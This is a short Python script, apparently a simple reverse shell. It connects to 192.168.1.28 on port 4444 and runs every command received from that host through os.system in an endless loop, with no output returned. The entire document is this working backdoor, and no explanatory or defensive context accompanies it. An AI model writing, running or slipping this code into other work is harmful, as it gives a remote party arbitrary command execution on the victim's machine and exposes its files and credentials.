import socket
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.28', 4444))

while True:
    msg = s.recv(1024)
    os.system(msg.decode("utf-8"))
